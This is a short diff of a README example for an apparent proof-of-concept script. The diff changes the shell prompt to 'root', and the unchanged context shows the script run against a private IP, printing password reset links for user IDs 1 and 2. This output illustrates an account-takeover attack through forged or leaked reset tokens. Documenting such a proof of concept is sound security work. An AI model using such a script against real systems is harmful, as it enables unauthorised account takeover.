@@ -33,7 +33,7 @@ Example
 ---
 
 ```
-[2021-11-29T15:44:27Z] rwiggins@MBP-3623:/tmp$ python3 test.py -u http://192.168.1.170
+[2021-11-29T15:44:27Z] root@MBP-3623:/tmp$ python3 test.py -u http://192.168.1.170
 Rest Link http://192.168.1.170/reset/IjEi.YaT1sQ.e6w1vMsG-gx0OVT0qV5aH_aI7IA - UserID: 1
 
 http://192.168.1.170/reset/IjIi.YaT1sQ.j67-OQljn2ivQiyw9Y9wa7G6GY0
